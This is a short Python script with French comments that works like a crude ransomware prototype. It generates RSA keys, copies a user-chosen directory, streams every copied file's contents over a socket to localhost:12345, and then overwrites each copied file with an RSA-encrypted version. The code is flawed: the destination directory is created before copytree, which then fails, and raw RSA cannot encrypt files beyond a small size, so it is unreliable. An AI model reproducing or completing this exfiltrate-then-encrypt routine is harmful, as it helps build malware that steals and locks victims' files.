import os
import shutil
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.backends import default_backend
import socket

# genere les clefs
private_key = rsa.generate_private_key(
    public_exponent=65537,
    key_size=2048,
    backend=default_backend()
)
public_key = private_key.public_key()

# stocker les clés
with open('private_key.pem', 'wb') as f:
    f.write(private_key.private_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PrivateFormat.PKCS8,
        encryption_algorithm=serialization.NoEncryption()
    ))
with open('public_key.pem', 'wb') as f:
    f.write(public_key.public_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PublicFormat.SubjectPublicKeyInfo
    ))

source_dir = input("Entrez le chemin du répertoire source : ")

destination_dir = os.path.join(os.getcwd(), 'copie')
os.mkdir(destination_dir)

shutil.copytree(source_dir, destination_dir)

server_address = ('localhost', 12345)
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(server_address)

for root, dirs, files in os.walk(destination_dir):
    for file in files:
        file_path = os.path.join(root, file)
        with open(file_path, 'rb') as f:
            data = f.read()
        sock.sendall(data)

# chiffre les données
for root, dirs, files in os.walk(destination_dir):
    for file in files:
        file_path = os.path.join(root, file)
        with open(file_path, 'rb') as f:
            data = f.read()
        encrypted_data = public_key.encrypt(
            data,
            padding.OAEP(
                mgf=padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None
            )
        )
        with open(file_path, 'wb') as f:
            f.write(encrypted_data)

# dechine les données
with open('tampon.txt', 'rb') as f:
    data = f.read()
decrypted_data = private_key.decrypt(
    data,
    padding.OAEP(
        mgf=padding.MGF1(algorithm=hashes.SHA256()),
        algorithm=hashes.SHA256(),
        label=None
    )
)
print(decrypted_data.decode())
